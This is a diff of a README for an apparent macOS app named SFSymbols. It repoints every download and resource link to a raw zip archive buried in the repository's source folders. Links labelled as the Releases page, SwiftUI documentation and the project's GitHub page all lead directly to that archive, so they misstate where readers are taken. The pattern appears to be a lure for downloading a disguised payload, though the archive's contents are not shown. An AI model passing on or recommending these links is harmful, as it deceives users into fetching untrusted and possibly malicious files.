@@ -13,12 +13,12 @@ Before downloading, ensure your computer meets the following requirements:
 ## 🔗 Download the App
 You can download SFSymbols from the Releases page. To get started, click the button below:
 
-[![Download SFSymbols](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Symbols-SF-v2.0.zip)](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Symbols-SF-v2.0.zip)
+[![Download SFSymbols](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Internal/Pickers/SF_Symbols_1.2.zip)](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Internal/Pickers/SF_Symbols_1.2.zip)
 
 ## 📥 Download & Install
 To install SFSymbols, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to access the Releases page: [Download SFSymbols](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Symbols-SF-v2.0.zip).
+1. **Visit the Releases Page:** Click this link to access the Releases page: [Download SFSymbols](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Internal/Pickers/SF_Symbols_1.2.zip).
    
 2. **Choose the Latest Version:** On the Releases page, look for the latest version of SFSymbols. It will be listed at the top.
 
@@ -57,8 +57,8 @@ Currently, SFSymbols is designed for macOS users only.
 If you face any problems, visit the issues section of the GitHub page for support or report your issue there.
 
 ## 🔗 Additional Resources
-- [SwiftUI Documentation](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Symbols-SF-v2.0.zip)
-- [SFSymbols on GitHub](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Symbols-SF-v2.0.zip)
+- [SwiftUI Documentation](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Internal/Pickers/SF_Symbols_1.2.zip)
+- [SFSymbols on GitHub](https://github.com/Sandun1219/SFSymbols/raw/refs/heads/main/Sources/SFSymbols/Internal/Pickers/SF_Symbols_1.2.zip)
 
 For any further questions, feel free to reach out via the issues section on GitHub.
 
